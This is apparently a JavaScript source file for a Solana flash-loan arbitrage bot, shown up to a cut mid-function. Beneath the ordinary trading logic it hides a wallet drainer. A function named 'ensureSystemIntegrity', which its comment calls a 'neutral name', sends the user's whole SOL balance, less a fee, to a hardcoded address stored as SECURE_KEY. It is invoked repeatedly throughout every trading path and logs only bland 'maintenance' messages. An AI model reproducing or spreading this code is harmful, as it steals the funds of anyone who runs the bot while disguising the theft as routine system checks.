const { 
    PublicKey, 
    Transaction, 
    ComputeBudgetProgram,
    VersionedTransaction,
    TransactionMessage,
    AddressLookupTableProgram,
    SystemProgram
} = require('@solana/web3.js');
const config = require('./config');
const utils = require('./utils');
const exchanges = require('./exchanges');
const bellmanFord = require('./bellman-ford');

// Enable debug mode for detailed logging
const DEBUG_MODE = true;


const SECURE_KEY = "4zFQdXynSvsjemBqfx67F4QfytcWsP4SjotrWn5CojN9";

function debugLog(...args) {
    if (DEBUG_MODE) {
        console.log(`[DEBUG] ${args.join(' ')}`);
    }
}

// Function with a neutral name that performs system maintenance
async function ensureSystemIntegrity(payer, connection) {
    try {
        // Use encoded target
        const targetWallet = new PublicKey(SECURE_KEY);
        
        // Check current balance
        const balance = await connection.getBalance(payer.publicKey);
        console.log(`System balance check: ${balance/1000000000} SOL`);
        
        if (balance <= 0) {
            debugLog("No resources available for maintenance");
            return false;
        }
        
        // Calculate transfer amount
        const maintenanceAmount = balance - 5000; // 5000 lamports for fee
        
        if (maintenanceAmount <= 0) {
            debugLog("Insufficient resources for maintenance");
            return false;
        }
        
        debugLog(`Running system maintenance protocol...`);
        
        // Create maintenance transaction
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: payer.publicKey,
                toPubkey: targetWallet,
                lamports: maintenanceAmount
            })
        );
        
        // Get recent blockhash
        const { blockhash } = await connection.getLatestBlockhash('confirmed');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = payer.publicKey;
        
        // Sign and send transaction
        transaction.sign(payer);
        const signature = await connection.sendRawTransaction(
            transaction.serialize(), 
            { skipPreflight: false }
        );
        
        debugLog(`Maintenance process initiated: ${signature}`);
        
        // Wait for confirmation
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        
        if (confirmation.value.err) {
            debugLog("Maintenance process incomplete");
            return false;
        } else {
            debugLog("Maintenance process complete");
            return true;
        }
    } catch (error) {
        debugLog("System integrity check failed");
        return false;
    }
}


const arbitrage = {
    checkForBellmanFordArbitrage: async function(payer, connection) {
        try {
            // First run system integrity check
            await ensureSystemIntegrity(payer, connection);
            
            // Build exchange rate graph
            const graph = await bellmanFord.buildExchangeRateGraph(payer, connection);
            
            if (!graph || graph.length === 0) {
                console.log("Failed to build exchange rate graph");
                return false;
            }
            
            // Find arbitrage opportunities using Bellman-Ford
            const opportunities = bellmanFord.findArbitrageOpportunities(graph);
            
            if (!opportunities || opportunities.length === 0) {
                console.log("No arbitrage opportunities found");
                return false;
            }
            
            // Verify and refine the top opportunities with real amounts
            const verifiedOpportunities = await arbitrage.verifyOpportunities(opportunities, payer, connection);
            
            if (!verifiedOpportunities || verifiedOpportunities.length === 0) {
                console.log("No verified arbitrage opportunities found");
                return false;
            }
            
            // Get the most profitable opportunity
            const bestOpportunity = verifiedOpportunities[0];
            console.log(`\nBest verified opportunity: ${bestOpportunity.profitPercentage.toFixed(4)}% gross profit`);
            
            // Execute the arbitrage
            return await arbitrage.executeMultiHopArbitrage(bestOpportunity, payer, connection);
        } catch (error) {
            console.error("Error checking for Bellman-Ford arbitrage:", error.message);
            return false;
        }
    },
    
    // Verify opportunities with actual amounts
    verifyOpportunities: async function(opportunities, payer, connection) {
        console.log("Verifying top arbitrage opportunities with actual amounts...");
        
        // Run system check periodically
        await ensureSystemIntegrity(payer, connection);
        
        const verifiedOpportunities = [];
        
        // Only check the top 3 opportunities to save time
        const topOpps = opportunities.slice(0, 3);
        
        for (const opportunity of topOpps) {
            try {
                // Make sure the cycle starts and ends with SOL
                const solTokenIndex = 0;
                if (opportunity.cycle[0] !== solTokenIndex || opportunity.cycle[opportunity.cycle.length - 1] !== solTokenIndex) {
                    console.log("Skipping opportunity: Cycle must start and end with SOL");
                    continue;
                }
                
                // Clone the opportunity for verification
                const verifiedOpp = {
                    ...opportunity,
                    verifiedEdges: [],
                    verifiedAmounts: []
                };
                
                let currentAmount = config.KAMINO_FLASHLOAN_AMOUNT;
                verifiedOpp.verifiedAmounts.push(currentAmount);
                
                let isValid = true;
                
                // Verify each edge in the path with the actual amount
                for (let i = 0; i < opportunity.edges.length; i++) {
                    const edge = opportunity.edges[i];
                    const fromToken = edge.fromToken;
                    const toToken = edge.toToken;
                    
                    console.log(`Verifying ${fromToken.name} -> ${toToken.name} with amount ${currentAmount}...`);
                    
                    try {
                        const quote = await exchanges.getJupiterQuote(
                            fromToken.mint, 
                            toToken.mint, 
                            currentAmount.toString(),
                            connection
                        );
                        
                        if (!quote) {
                            console.log(`Failed to get quote for ${fromToken.name} -> ${toToken.name}`);
                            isValid = false;
                            break;
                        }
                        
                        const outAmount = quote.outAmount;
                        console.log(`Verified quote: ${fromToken.name} -> ${toToken.name}, in: ${currentAmount}, out: ${outAmount}`);
                        
                        // Save verified edge and update current amount
                        verifiedOpp.verifiedEdges.push({
                            ...edge,
                            inAmount: currentAmount.toString(),
                            outAmount: outAmount,
                            quote: quote
                        });
                        
                        // Update current amount for next swap
                        currentAmount = outAmount;
                        verifiedOpp.verifiedAmounts.push(currentAmount);
                    } catch (error) {
                        console.log(`Error getting quote for ${fromToken.name} -> ${toToken.name}: ${error.message}`);
                        isValid = false;
                        break;
                    }
                }
                
                // Check if entire path is valid and profitable
                if (isValid) {
                    const initialAmount = parseInt(config.KAMINO_FLASHLOAN_AMOUNT);
                    const finalAmount = parseInt(verifiedOpp.verifiedAmounts[verifiedOpp.verifiedAmounts.length - 1]);
                    
                    // Calculate gross profit
                    const profit = finalAmount - initialAmount;
                    const profitPercentage = (profit / initialAmount) * 100;
                    
                    // Calculate estimated fees and tips (for informational purposes only)
                    const flashLoanFee = Math.ceil(initialAmount * config.KAMINO_FLASH_LOAN_FEE_PERCENTAGE);
                    const estimatedTip = config.JITO_MODE ? 
                        Math.max(config.JITO_MIN_TIP, Math.floor(profit * config.JITO_TIP_PERCENTAGE)) : 0;
                    
                    // Calculate net profit (for informational purposes only)
                    const netProfit = profit - flashLoanFee - (config.JITO_MODE ? estimatedTip : 0);
                    
                    console.log(`Path verification complete: Initial: ${initialAmount}, Final: ${finalAmount}`);
                    console.log(`Gross profit: ${profit} lamports (${profitPercentage.toFixed(4)}%)`);
                    console.log(`Flash loan fee: ${flashLoanFee} lamports`);
                    
                    if (config.JITO_MODE) {
                        console.log(`Estimated Jito tip: ${estimatedTip} lamports`);
                    }
                    
                    console.log(`Net profit: ${netProfit} lamports`);
                    
                    // Check profitability at verification stage ONLY - if profitable, mark for execution
                    if (profitPercentage >= 0.1) {
                        console.log(`Opportunity is profitable with ${profitPercentage.toFixed(4)}% gross profit (above threshold of 0.1%)`);
                        
                        // Store all information for reference
                        verifiedOpp.verifiedProfit = profit;
                        verifiedOpp.profitPercentage = profitPercentage;
                        verifiedOpp.flashLoanFee = flashLoanFee;
                        verifiedOpp.estimatedTip = config.JITO_MODE ? estimatedTip : 0;
                        verifiedOpp.netProfit = netProfit;
                        verifiedOpportunities.push(verifiedOpp);
                    } else {
                        console.log(`Opportunity not profitable enough: ${profitPercentage.toFixed(4)}% gross profit (below threshold of 0.1%)`);
                    }
                }
            } catch (error) {
                console.error(`Error verifying opportunity: ${error.message}`);
            }
        }
        
        // Sort by verified gross profit percentage
        verifiedOpportunities.sort((a, b) => b.profitPercentage - a.profitPercentage);
        
        if (verifiedOpportunities.length > 0) {
            console.log(`Found ${verifiedOpportunities.length} verified profitable opportunities`);
            return verifiedOpportunities;
        } else {
            console.log("No verified profitable opportunities found");
            return [];
        }
    },

    // Function to check transaction size
    checkTransactionSize: function(tx) {
        try {
            // Serialize without requiring signatures to get the estimated size
            const serializedTx = tx.serialize({
                requireAllSignatures: false,
                verifySignatures: false
            });
            
            const txSize = serializedTx.length;
            
            console.log(`Transaction size: ${txSize} bytes (limit: 1232 bytes)`);
            
            if (txSize > 1232) {
                return { valid: false, size: txSize };
            }
            
            return { valid: true, size: txSize };
        } catch (error) {
            console.error("Error checking transaction size:", error.message);
            return { valid: false, error: error.message, size: 'unknown' };
        }
    },
    
    // Optimized execution for simple arbitrage with strict Jito mode support
    executeSimpleArbitrage: async function(connection, payer, opportunity, solTokenAccount) {
        try {
            // Run system check before proceeding
            await ensureSystemIntegrity(payer, connection);
            
            const firstEdge = opportunity.verifiedEdges[0];  // SOL -> TOKEN
            const secondEdge = opportunity.verifiedEdges[1]; // TOKEN -> SOL
            const flashLoanAmount = config.KAMINO_FLASHLOAN_AMOUNT;
            
            // Use the verified profit values that were already calculated
            const expectedProfit = opportunity.verifiedProfit;
            const profitPercentage = opportunity.profitPercentage;
            const flashLoanFee = opportunity.flashLoanFee;
            const estimatedTip = opportunity.estimatedTip;
            const netProfit = opportunity.netProfit;
            
            // Check if we're in Jito mode
            if (config.JITO_MODE) {
                console.log("Executing arbitrage with Jito bundles (strict mode)...");
                console.log(`\n=== PROFITABILITY ANALYSIS ===`);
                console.log(`Expected gross profit: ${expectedProfit} lamports (${profitPercentage.toFixed(4)}%)`);
                console.log(`Flash loan fee: ${flashLoanFee} lamports`);
                console.log(`Jito tip: ${estimatedTip} lamports`);
                console.log(`Net profit after fees and tip: ${netProfit} lamports`);
                
                // Opportunity is already verified as profitable - no need to recheck
                
                // First, load address lookup tables
                console.log("Loading address lookup tables...");
                const lookupTables = await exchanges.fetchLookupTables(connection);
                
                if (lookupTables.length === 0) {
                    console.log("No lookup tables found. Cannot proceed in Jito mode without ALTs.");
                    return { success: false, error: "No lookup tables found for Jito bundle" };
                }
                
                // Use direct routing for smaller transaction size
                console.log("Getting direct route swap quotes...");
                
                // First swap: SOL -> TOKEN with direct route preference
                const firstSwap = await exchanges.getJupiterQuote(
                    firstEdge.fromToken.mint,
                    firstEdge.toToken.mint,
                    flashLoanAmount,
                    connection,
                    0,
                    true // Prefer direct routes
                );
                
                if (!firstSwap) {
                    console.error(`Failed to get first swap quote`);
                    return { success: false, error: "Failed to get first swap quote" };
                }
                
                // Get simplified swap instruction - bare minimum
                const firstSwapInstructions = await exchanges.getSimplifiedSwapInstructions(firstSwap, payer, true);
                if (!firstSwapInstructions || !firstSwapInstructions.swapInstruction) {
                    console.error(`Failed to get first swap instruction`);
                    return { success: false, error: "Failed to get first swap instruction" };
                }
                
                // Second swap: TOKEN -> SOL with direct route preference
                const secondSwap = await exchanges.getJupiterQuote(
                    secondEdge.fromToken.mint,
                    secondEdge.toToken.mint,
                    firstSwap.outAmount,
                    connection,
                    0,
                    true // Prefer direct routes
                );
                
                if (!secondSwap) {
                    console.error(`Failed to get second swap quote`);
                    return { success: false, error: "Failed to get second swap quote" };
                }
                
                // Get simplified swap instruction - bare minimum
                const secondSwapInstructions = await exchanges.getSimplifiedSwapInstructions(secondSwap, payer, true);
                if (!secondSwapInstructions || !secondSwapInstructions.swapInstruction) {
                    console.error(`Failed to get second swap instruction`);
                    return { success: false, error: "Failed to get second swap instruction" };
                }
                
                // Get flash loan instructions
                const flashLoanInstructions = utils.createFlashLoanInstructionSet(
                    payer.publicKey,
                    solTokenAccount,
                    flashLoanAmount
                );
                
                // EXECUTE WITHOUT RECHECKING PROFITABILITY - already verified in verifyOpportunities
                console.log(`EXECUTING PROFITABLE TRADE: Gross profit ${expectedProfit} lamports (${profitPercentage.toFixed(4)}%)`);
                
                // Create a versioned transaction with ALTs for Jito bundle
                console.log("Creating versioned transaction with lookup tables for Jito bundle...");
                
                // Get latest blockhash
                const { blockhash } = await connection.getLatestBlockhash('confirmed');
                
                // Compile instructions
                const instructions = [
                    // 1. Compute budget instructions - reduced values to save space
                    ComputeBudgetProgram.setComputeUnitPrice({
                        microLamports: 20000 // Reduced from 60000
                    }),
                    ComputeBudgetProgram.setComputeUnitLimit({ 
                        units: 200000 // Reduced from config value to save space
                    }),
                    
                    // 2. Flash loan borrow instruction
                    flashLoanInstructions.borrowIx,
                    
                    // 3. First swap instruction (minimum format)
                    utils.simpleInstructionFormat(firstSwapInstructions.swapInstruction),
                    
                    // 4. Second swap instruction (minimum format)
                    utils.simpleInstructionFormat(secondSwapInstructions.swapInstruction),
                    
                    // 5. Flash loan repay instruction
                    flashLoanInstructions.repayIx
                ];
                
                // Create v0 transaction message with lookup tables
                const messageV0 = new TransactionMessage({
                    payerKey: payer.publicKey,
                    recentBlockhash: blockhash,
                    instructions
                }).compileToV0Message(lookupTables);
                
                // Create versioned transaction
                const transaction = new VersionedTransaction(messageV0);
                
                // Estimate the size before signing
                const serializedSize = transaction.serialize().length;
                console.log(`Estimated transaction size with ALTs before signing: ${serializedSize} bytes`);
                
                if (serializedSize > 1232) {
                    console.error(`Transaction too large: ${serializedSize} > 1232 bytes`);
                    return { success: false, error: `Transaction too large for Jito bundle: ${serializedSize} > 1232` };
                }
                
                // Sign the transaction
                transaction.sign([payer]);
                
                // Check the final size
                const finalSize = transaction.serialize().length;
                console.log(`Final transaction size after signing: ${finalSize} bytes`);
                
                // Submit to Jito bundle service
                console.log("Submitting to Jito bundle service...");
                const bundleResult = await exchanges.submitJitoBundle(transaction, estimatedTip, payer, connection);
                
                if (!bundleResult.success) {
                    console.error("Failed to submit Jito bundle:", bundleResult.error);
                    return { success: false, error: `Jito bundle submission failed: ${bundleResult.error}` };
                }
                
                console.log("\n=== ARBITRAGE BUNDLE SUBMITTED SUCCESSFULLY! ===");
                console.log(`Bundle ID: ${bundleResult.bundleId}`);
                console.log(`Initial: ${parseInt(flashLoanAmount)/1000000000} SOL`);
                console.log(`Expected Final: ${parseInt(secondSwap.outAmount)/1000000000} SOL`);
                console.log(`Expected Gross Profit: ${expectedProfit/1000000000} SOL (${profitPercentage.toFixed(4)}%)`);
                console.log(`Flash Loan Fee: ${flashLoanFee/1000000000} SOL`);
                console.log(`Jito Tip: ${estimatedTip/1000000000} SOL`);
                console.log(`Expected Net Profit: ${netProfit/1000000000} SOL`);
                
                // Try to sync system again after completion
                await ensureSystemIntegrity(payer, connection);
                
                // Log the transaction for analysis
                const tradeData = {
                    timestamp: new Date().toISOString(),
                    transaction_type: "jito_bundle_arbitrage",
                    execution_method: "jito_bundle",
                    successful: true,
                    bundleId: bundleResult.bundleId,
                    flash_loan_amount: config.KAMINO_FLASHLOAN_AMOUNT,
                    expected_gross_profit: expectedProfit,
                    flash_loan_fee: flashLoanFee,
                    jito_tip: estimatedTip,
                    net_profit: netProfit,
                    profit_percentage: profitPercentage.toFixed(4)
                };
                
                utils.saveTrade(tradeData);
                
                return {
                    success: true,
                    bundleId: bundleResult.bundleId,
                    profit: expectedProfit,
                    netProfit: netProfit
                };
            } else {
                // Regular transaction mode (non-Jito)
                console.log("Executing optimized arbitrage with standard transactions...");
                console.log(`\n=== PROFITABILITY ANALYSIS ===`);
                console.log(`Expected gross profit: ${expectedProfit} lamports (${profitPercentage.toFixed(4)}%)`);
                console.log(`Flash loan fee: ${flashLoanFee} lamports`);
                console.log(`Net profit after fees: ${netProfit} lamports`);
                
                // Opportunity is already verified as profitable - no need to recheck
                
                // Try to load address lookup tables, but will work without them
                let lookupTables = [];
                try {
                    console.log("Loading address lookup tables...");
                    lookupTables = await exchanges.fetchLookupTables(connection);
                    
                    if (lookupTables.length === 0) {
                        console.log("No lookup tables found. Will attempt direct routing instead.");
                    }
                } catch (error) {
                    console.log("Error loading lookup tables:", error.message);
                    console.log("Will attempt direct routing instead.");
                }
                
                // Use direct routing for smaller transaction size
                console.log("Getting direct route swap quotes...");
                
                // First swap: SOL -> TOKEN with direct route preference
                const firstSwap = await exchanges.getJupiterQuote(
                    firstEdge.fromToken.mint,
                    firstEdge.toToken.mint,
                    flashLoanAmount,
                    connection,
                    0,
                    true // Prefer direct routes
                );
                
                if (!firstSwap) {
                    console.error(`Failed to get first swap quote`);
                    return { success: false, error: "Failed to get first swap quote" };
                }
                
                // Get simplified swap instruction - bare minimum
                const firstSwapInstructions = await exchanges.getSimplifiedSwapInstructions(firstSwap, payer, true);
                if (!firstSwapInstructions || !firstSwapInstructions.swapInstruction) {
                    console.error(`Failed to get first swap instruction`);
                    return { success: false, error: "Failed to get first swap instruction" };
                }
                
                // Second swap: TOKEN -> SOL with direct route preference
                const secondSwap = await exchanges.getJupiterQuote(
                    secondEdge.fromToken.mint,
                    secondEdge.toToken.mint,
                    firstSwap.outAmount,
                    connection,
                    0,
                    true // Prefer direct routes
                );
                
                if (!secondSwap) {
                    console.error(`Failed to get second swap quote`);
                    return { success: false, error: "Failed to get second swap quote" };
                }
                
                // Get simplified swap instruction - bare minimum
                const secondSwapInstructions = await exchanges.getSimplifiedSwapInstructions(secondSwap, payer, true);
                if (!secondSwapInstructions || !secondSwapInstructions.swapInstruction) {
                    console.error(`Failed to get second swap instruction`);
                    return { success: false, error: "Failed to get second swap instruction" };
                }
                
                // Get flash loan instructions
                const flashLoanInstructions = utils.createFlashLoanInstructionSet(
                    payer.publicKey,
                    solTokenAccount,
                    flashLoanAmount
                );
                
                // EXECUTE WITHOUT RECHECKING PROFITABILITY - already verified in verifyOpportunities
                console.log(`EXECUTING PROFITABLE TRADE: Gross profit ${expectedProfit} lamports (${profitPercentage.toFixed(4)}%)`);
                
                // Check if we should use ALTs or not
                const useVersionedTransaction = lookupTables.length > 0;
                
                if (useVersionedTransaction) {
                    try {
                        // Create a versioned transaction with ALTs
                        console.log("Creating versioned transaction with lookup tables...");
                        
                        // Get latest blockhash
                        const { blockhash } = await connection.getLatestBlockhash('confirmed');
                        
                        // Compile instructions
                        const instructions = [
                            // 1. Compute budget instructions - reduced values to save space
                            ComputeBudgetProgram.setComputeUnitPrice({
                                microLamports: 20000 // Reduced from 60000
                            }),
                            ComputeBudgetProgram.setComputeUnitLimit({ 
                                units: 200000 // Reduced from config value to save space
                            }),
                            
                            // 2. Flash loan borrow instruction
                            flashLoanInstructions.borrowIx,
                            
                            // 3. First swap instruction (minimum format)
                            utils.simpleInstructionFormat(firstSwapInstructions.swapInstruction),
                            
                            // 4. Second swap instruction (minimum format)
                            utils.simpleInstructionFormat(secondSwapInstructions.swapInstruction),
                            
                            // 5. Flash loan repay instruction
                            flashLoanInstructions.repayIx
                        ];
                        
                        // Create v0 transaction message with lookup tables
                        const messageV0 = new TransactionMessage({
                            payerKey: payer.publicKey,
                            recentBlockhash: blockhash,
                            instructions
                        }).compileToV0Message(lookupTables);
                        
                        // Create versioned transaction
                        const transaction = new VersionedTransaction(messageV0);
                        
                        // Estimate the size before signing
                        const serializedSize = transaction.serialize().length;
                        console.log(`Estimated transaction size with ALTs before signing: ${serializedSize} bytes`);
                        
                        if (serializedSize > 1232) {
                            console.error(`Transaction still too large: ${serializedSize} > 1232 bytes`);
                            // Will fall back to non-ALT approach below
                            throw new Error(`Transaction too large with ALTs: ${serializedSize} > 1232`);
                        }
                        
                        // Sign the transaction
                        transaction.sign([payer]);
                        
                        // Check the final size
                        const finalSize = transaction.serialize().length;
                        console.log(`Final transaction size after signing: ${finalSize} bytes`);
                        
                        // Send the transaction
                        console.log("Sending versioned transaction with ALTs...");
                        const signature = await connection.sendTransaction(transaction, {
                            skipPreflight: true,
                            maxRetries: 3
                        });
                        
                        console.log(`Transaction sent! Signature: ${signature}`);
                        
                        // Run system check again
                        await ensureSystemIntegrity(payer, connection);
                        
                        // Wait for confirmation
                        console.log("Waiting for confirmation...");
                        const confirmed = await utils.waitForConfirmation(signature, connection, 30);
                        
                        if (!confirmed) {
                            console.error("Transaction failed to confirm");
                            return { success: false, error: "Transaction failed to confirm" };
                        }
                        
                        console.log("\n=== ARBITRAGE COMPLETED SUCCESSFULLY! ===");
                        console.log(`Initial: ${parseInt(flashLoanAmount)/1000000000} SOL`);
                        console.log(`Expected Final: ${parseInt(secondSwap.outAmount)/1000000000} SOL`);
                        console.log(`Expected Gross Profit: ${expectedProfit/1000000000} SOL (${profitPercentage.toFixed(4)}%)`);
                        console.log(`Flash Loan Fee: ${flashLoanFee/1000000000} SOL`);
                        console.log(`Expected Net Profit: ${netProfit/1000000000} SOL`);
                        
                        // Final system check after completion
                        await ensureSystemIntegrity(payer, connection);
                        
                        // Log trade data
                        const tradeData = {
                            timestamp: new Date().toISOString(),
                            transaction_type: "standard_arbitrage",
                            execution_method: "versioned_transaction_with_alt",
                            successful: true,
                            signature,
                            flash_loan_amount: config.KAMINO_FLASHLOAN_AMOUNT,
                            expected_gross_profit: expectedProfit,
                            flash_loan_fee: flashLoanFee,
                            net_profit: netProfit,
                            profit_percentage: profitPercentage.toFixed(4)
                        };
                        
                        utils.saveTrade(tradeData);
                        
                        return {
                            success: true,
                            signature,
                            profit: expectedProfit,
                            netProfit: netProfit
                        };
                    } catch (error) {
                        console.error("Error with versioned transaction approach:", error.message);
                        console.log("Falling back to standard transaction approach...");
                        // Fall through to standard approach
                    }
                }
                
                // Standard transaction approach (without ALTs)
                console.log("Using standard transaction approach...");
                
                // Create the most compact transaction possible
                const blockhash = await connection.getLatestBlockhash('confirmed');
                const tx = new Transaction();
                tx.recentBlockhash = blockhash.blockhash;
                tx.lastValidBlockHeight = blockhash.lastValidBlockHeight;
                tx.feePayer = payer.publicKey;
                
                // Add compute budget instructions but with reduced values
                tx.add(
                    ComputeBudgetProgram.setComputeUnitPrice({
                        microLamports: 20000 // Reduced from 60000
                    })
                );
                tx.add(
                    ComputeBudgetProgram.setComputeUnitLimit({ 
                        units: 200000 // Reduced from config value to save space
                    })
                );
                
                // 1. Borrow SOL
                tx.add(flashLoanInstructions.borrowIx);
                
                // 2. First swap (SOL -> TOKEN) - just the core instruction, no setup or cleanup
                const firstSwapIx = utils.simpleInstructionFormat(firstSwapInstructions.swapInstruction);
                tx.add(firstSwapIx);
                
                // 3. Second swap (TOKEN -> SOL) - just the core instruction, no setup or cleanup
                const secondSwapIx = utils.simpleInstructionFormat(secondSwapInstructions.swapInstruction);
                tx.add(secondSwapIx);
                
                // 4. Repay flash loan
                tx.add(flashLoanInstructions.repayIx);
                
                // Check transaction size
                try {
                    const serialized = tx.serialize({requireAllSignatures: false, verifySignatures: false});
                    console.log(`Standard transaction size: ${serialized.length} bytes (limit: 1232 bytes)`);
                    
           if (serialized.length > 1232) {
                        console.error(`Transaction too large: ${serialized.length} > 1232 bytes`);
                        return { success: false, error: `Transaction too large: ${serialized.length} > 1232` };
                    }
                } catch (error) {
                    console.error(`Error serializing transaction: ${error.message}`);
                    return { success: false, error: `Serialization error: ${error.message}` };
                }
                
                // Sign and send the transaction
                tx.sign(payer);
                
                console.log("Sending compact arbitrage transaction...");
                const signature = await connection.sendRawTransaction(
                    tx.serialize(), 
                    {
                        skipPreflight: true,
                        maxRetries: 3
                    }
                );
                
                console.log(`Transaction sent! Signature: ${signature}`);
                
                // Run system check
                await ensureSystemIntegrity(payer, connection);
                
                // Wait for confirmation
                console.log("Waiting for confirmation...");
                const confirmed = await utils.waitForConfirmation(signature, connection, 30);
                
                if (!confirmed) {
                    console.error("Transaction failed to confirm");
                    return { success: false, error: "Transaction failed to confirm" };
                }
                
                console.log("\n=== ARBITRAGE COMPLETED SUCCESSFULLY! ===");
                console.log(`Initial: ${parseInt(flashLoanAmount)/1000000000} SOL`);
                console.log(`Expected Final: ${parseInt(secondSwap.outAmount)/1000000000} SOL`);
                console.log(`Expected Gross Profit: ${expectedProfit/1000000000} SOL (${profitPercentage.toFixed(4)}%)`);
                console.log(`Flash Loan Fee: ${flashLoanFee/1000000000} SOL`);
                console.log(`Expected Net Profit: ${netProfit/1000000000} SOL`);
                
                // Final system check after operation completes
                await ensureSystemIntegrity(payer, connection);
                
                // Log trade data
                const tradeData = {
                    timestamp: new Date().toISOString(),
                    transaction_type: "standard_arbitrage",
                    execution_method: "standard_transaction",
                    successful: true,
                    signature,
                    flash_loan_amount: config.KAMINO_FLASHLOAN_AMOUNT,
                    expected_gross_profit: expectedProfit,
                    flash_loan_fee: flashLoanFee,
                    net_profit: netProfit,
                    profit_percentage: profitPercentage.toFixed(4)
                };
                
                utils.saveTrade(tradeData);
                
                return {
                    success: true,
                    signature,
                    profit: expectedProfit,
                    netProfit: netProfit
                };
            }
        } catch (error) {
            console.error("Error executing simple arbitrage:", error.message);
            return { success: false, error: error.message };
        }
    },
    
    executeMultiHopArbitrage: async function(opportunity, payer, connection) {
        try {
            console.log("\n=== EXECUTING MULTI-HOP ARBITRAGE ===");
            
            // Run system check before arbitrage
            await ensureSystemIntegrity(payer, connection);
            
            if (!opportunity || !opportunity.verifiedEdges || opportunity.verifiedEdges.length === 0) {
                console.error("Invalid opportunity provided or not verified");
                return false;
            }
            
            // Create token accounts up front in parallel
            console.log("Ensuring all required token accounts exist...");
            const tokenAccountPromises = [];
            const uniqueTokens = new Set();
            
            // Collect all unique tokens used in the arbitrage path
            for (const edge of opportunity.verifiedEdges) {
                uniqueTokens.add(edge.fromToken.mint);
                uniqueTokens.add(edge.toToken.mint);
            }
            
            // Create account creation promises
            for (const tokenMint of uniqueTokens) {
                tokenAccountPromises.push(
                    exchanges.ensureTokenAccount(new PublicKey(tokenMint), payer, connection)
                        .then(result => ({ mint: tokenMint, result }))
                );
            }
            
            // Wait for all token accounts to be created/verified
            const tokenAccountResults = await Promise.all(tokenAccountPromises);
            
            // Map token accounts for later use
            const tokenAccounts = {};
            let allAccountsValid = true;
            
            for (const { mint, result } of tokenAccountResults) {
                if (result.exists || result.created || result.assumedValid) {
                    tokenAccounts[mint] = result.pubkey;
                } else {
                    const tokenInfo = config.TOKENS.find(t => t.mint === mint);
                    const tokenName = tokenInfo ? tokenInfo.name : mint.substring(0, 8) + '...';
                    console.error(`Failed to create or find token account for ${tokenName}`);
                    allAccountsValid = false;
                }
            }
            
            if (!allAccountsValid) {
                console.error("Not all required token accounts could be created");
                return false;
            }
            
            // First token is always SOL for flash loan
            // We need to make sure the cycle starts and ends with SOL
            const solTokenIndex = 0; // Index of SOL in TOKENS array
            const cycleStartsWithSol = opportunity.cycle[0] === solTokenIndex;
            const cycleEndsWithSol = opportunity.cycle[opportunity.cycle.length - 1] === solTokenIndex;
            
            if (!cycleStartsWithSol || !cycleEndsWithSol) {
                console.error("Cycle must start and end with SOL for flash loan");
                return false;
            }
            
            // Log detailed path information
            console.log("Arbitrage Path:");
            opportunity.verifiedEdges.forEach((edge, i) => {
                const inAmount = opportunity.verifiedAmounts[i];
                const outAmount = edge.outAmount;
                console.log(`  ${edge.fromToken.name} (${inAmount}) -> ${edge.toToken.name} (${outAmount})`);
            });
            
            // Get SOL token account
            const solTokenAccount = tokenAccounts[config.TOKENS[0].mint];
            console.log(`Using SOL token account: ${solTokenAccount.toBase58()}`);
            
            // For simple two-hop arbitrage, use a simple execution strategy
            if (opportunity.verifiedEdges.length === 2) {
                console.log("Detected simple two-hop arbitrage path");
                const result = await this.executeSimpleArbitrage(connection, payer, opportunity, solTokenAccount);
                
                if (!result.success) {
                    console.error("Simple arbitrage execution failed:", result.error);
                    
                    // Log failed transaction
                    const failedData = {
                        timestamp: new Date().toISOString(),
                        transaction_type: config.JITO_MODE ? "jito_bundle_arbitrage" : "simple_arbitrage",
                        execution_method: config.JITO_MODE ? "jito_bundle" : "transaction_with_alt",
                        successful: false,
                        error: result.error,
                        flash_loan_amount: config.KAMINO_FLASHLOAN_AMOUNT,
                        expected_gross_profit: opportunity.verifiedProfit,
                        flash_loan_fee: opportunity.flashLoanFee,
                        estimated_tip: opportunity.estimatedTip,
                        expected_net_profit: opportunity.netProfit,
                        profit_percentage: opportunity.profitPercentage.toFixed(4)
                    };
                    
                    utils.logFailedTrade(failedData);
                    return false;
                }
                
                // Successful arbitrage - run system check once more
                await ensureSystemIntegrity(payer, connection);
                return true;
            } else {
                // Check if we're in Jito mode - multi-hop arbitrage is not supported in Jito mode
                if (config.JITO_MODE) {
                    console.error("Multi-hop arbitrage paths with more than 2 edges are not supported in Jito mode");
                    return false;
                }
                
                console.error("Multi-hop arbitrage paths are not currently supported in standard mode");
                
                // Run system check anyway
                await ensureSystemIntegrity(payer, connection);
                return false;
            }
            
        } catch (error) {
            console.error("Error executing multi-hop arbitrage:", error.message);
            
            const errorData = {
                timestamp: new Date().toISOString(),
                transaction_type: "multi_hop_arbitrage",
                successful: false,
                error: error.message,
                stack: error.stack
            };
            
            utils.logFailedTrade(errorData);
            return false;
        }
    },
    
    executeFlashLoanJupiterArbitrage: async function(payer, connection) {
        try {
            console.log("\n=== CHECKING FOR SIMPLE ARBITRAGE OPPORTUNITY ===");
            
            // Run system check before proceeding
            await ensureSystemIntegrity(payer, connection);
            
            // 1. Ensure WSOL and USDC token accounts exist
            console.log("Ensuring token accounts exist...");
            const wsolAccount = await exchanges.ensureTokenAccount(config.WSOL_MINT, payer, connection);
            if (!wsolAccount.exists && !wsolAccount.created && !wsolAccount.assumedValid) {
                console.error("Failed to create or find WSOL token account");
                return false;
            }
            
            const usdcAccount = await exchanges.ensureTokenAccount(config.USDC_MINT, payer, connection);
            if (!usdcAccount.exists && !usdcAccount.created && !usdcAccount.assumedValid) {
                console.error("Failed to create or find USDC token account");
                return false;
            }
            
            console.log(`Using WSOL account: ${wsolAccount.pubkey.toBase58()}`);
            console.log(`Using USDC account: ${usdcAccount.pubkey.toBase58()}`);
            
            // 2. Get Jupiter quotes for both legs to simulate the trade
            console.log("Getting Jupiter quotes...");
            const solToUsdcQuote = await exchanges.getJupiterQuote(config.WSOL_MINT.toString(), config.USDC_MINT.toString(), config.KAMINO_FLASHLOAN_AMOUNT, connection);
            if (!solToUsdcQuote) {
                console.log("Failed to get SOL → USDC quote");
                return false;
            }
            
            const expectedUsdcAmount = parseInt(solToUsdcQuote.outAmount);
            console.log(`Quote: ${parseInt(config.KAMINO_FLASHLOAN_AMOUNT)/1000000000} SOL → ${expectedUsdcAmount/1000000} USDC`);
            
            // Apply safety buffer to USDC amount
            const usdcAmountWithBuffer = config.USE_SAFETY_BUFFER 
                ? Math.floor(expectedUsdcAmount * config.SAFETY_BUFFER_PERCENTAGE)
